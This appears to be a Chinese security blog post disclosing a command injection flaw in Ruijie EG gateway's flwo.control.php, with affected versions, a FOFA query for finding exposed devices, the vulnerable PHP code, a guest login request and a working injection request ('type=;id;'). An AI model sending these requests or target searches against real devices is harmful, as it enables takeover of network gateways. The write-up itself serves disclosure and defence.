---
title: "锐捷-EWEB flwo.control.php 命令注入漏洞"
source: https://mrxn.net/jswz/ruijieweb-flow_control_pi-flwo_control_setFlowGroup-type-rce.html
asset_dir: assets/锐捷-eweb-flwo.control.php-命令注入漏洞
---

# 锐捷-EWEB flwo.control.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/30 08:25
- 920浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

路由器

SQL

软件

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `flow_control_pi/flwo.control.php` 的 `setFlowGroupAction`存在[命令注入](https://mrxn.net/tag/rce)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)在设备上执行任意命令，造成设备失陷等高危风险。

代码安全审计

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

深入探索

服务器安全服务

网络安全课程

SQL注入防护

看下 `flow_control_pi/flwo.control.php` 关键业务 `setFlowGroupAction` 逻辑的实现

```
public function setFlowGroupAction() {
        $type = p("type");
        $command = '/etc/cmdmap/fc_group.sh '.$type;
        $contentstr = "";
        exec($command, $content);
        foreach ($content as &$value) {
            $contentstr = $contentstr.$value;
        }
        echo $contentstr;
    }
```

`type` 直接拼接进 `$command` 中后使用 `exec` 执行拼接后的命令，无过滤和检测，因此造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

## 获取cookie

```
POST /ddi/server/login.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest?
```

深入探索

VPN服务

云安全解决方案

安全研究工具

[![锐捷-EWEB flwo.control.php 命令注入漏洞](images/img-001-489e6f4b63e4.webp)](https://image.mrxn.net/e2433a412d6049e3b49ff42339f02422.webp)

## 命令注入

```
POST /flow_control_pi/flwo.control.php?a=setFlowGroup HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

type=;id;
```

[![锐捷-EWEB flwo.control.php 命令注入漏洞](images/img-002-48b9f9f0ce5b.webp)](https://image.mrxn.net/9cb43604f8564f30a6e11e4e44795028.webp)

成功执行 `id` 命令并回显结果。

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.获取cookie](#toc-5-1-)
- [5.2.命令注入](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
